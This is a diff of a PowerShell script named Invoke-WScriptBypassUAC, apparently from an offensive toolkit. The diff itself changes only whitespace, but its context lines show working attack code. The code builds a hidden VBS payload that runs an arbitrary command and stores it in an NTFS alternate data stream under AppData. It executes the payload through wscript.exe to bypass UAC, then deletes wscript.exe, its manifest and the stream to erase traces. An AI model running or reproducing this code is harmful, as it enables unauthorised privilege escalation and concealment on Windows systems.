@@ -39,7 +39,7 @@ function Invoke-WScriptBypassUAC
         $sTempFolder = $sTempFolder + "\"
         $sTempFileName = [System.IO.Path]::GetRandomFileName() + ".tmp"
         $sTempFileName = $sTempFileName -split '\.',([regex]::matches($sTempFileName,"\.").count) -join ''
-        $sTempFileNameFinal = $sTempFolder + $sTempFileName 
+        $sTempFileNameFinal = $sTempFolder + $sTempFileName
         return $sTempFileNameFinal
     }
 
@@ -51,13 +51,13 @@ function Invoke-WScriptBypassUAC
 
        # sleep for 2 seconds to allow for extraction to finish
        Start-Sleep -s 2
-       
+
        # remove the temp files
        Remove-Item $sTempFile
    }
 
     function Local:Invoke-WscriptTrigger {
-        
+
         $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
         $ADSFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''
 
@@ -67,7 +67,7 @@ function Invoke-WScriptBypassUAC
         $VBSPayload += "Set objShell = WScript.CreateObject(""WScript.Shell""):"
         $VBSPayload += "command = ""$payload"":"
         $VBSPayload += "objShell.Run command, 0:"
-        
+
         # stupid command to kick off a background cmd process to delete the wscript and manifest
         $DelCommand = "$($env:WINDIR)\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 >nul&&del $($env:WINDIR)\wscript.exe&&del $($env:WINDIR)\wscript.exe.manifest"""""""""
         $VBSPayload += "command = ""$DelCommand"":"
@@ -76,7 +76,7 @@ function Invoke-WScriptBypassUAC
 
         $CreateWrapperADS = {cmd /C "echo $VBSPayload > ""$env:USERPROFILE\AppData:$ADSFile"""}
         Invoke-Command -ScriptBlock $CreateWrapperADS
-        
+
         $ExecuteScript = {cmd /C "$($env:WINDIR)\wscript.exe ""$env:USERPROFILE\AppData:$ADSFile"""}
         Invoke-Command -ScriptBlock $ExecuteScript
         Remove-ADS $env:USERPROFILE\AppData:$ADSFile
@@ -134,13 +134,13 @@ function Invoke-WScriptBypassUAC
             [Parameter(Mandatory=$True)]
             [string]$ADSPath
         )
-     
+
         #region define P/Invoke types dynamically
         #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
         $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
         $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
         $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
-     
+
         $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
         $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
         $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
@@ -148,7 +148,7 @@ function Invoke-WScriptBypassUAC
             @('kernel32.dll'),
             [Reflection.FieldInfo[]]@($SetLastError),
             @($True))
-     
+
         # Define [Win32.Kernel32]::DeleteFile
         $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
             'kernel32.dll',
@@ -159,9 +159,9 @@ function Invoke-WScriptBypassUAC
             [Runtime.InteropServices.CallingConvention]::Winapi,
             [Runtime.InteropServices.CharSet]::Ansi)
         $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-        
+
         $Kernel32 = $TypeBuilder.CreateType()
-        
+
         $Result = $Kernel32::DeleteFile($ADSPath)
 
         if ($Result){
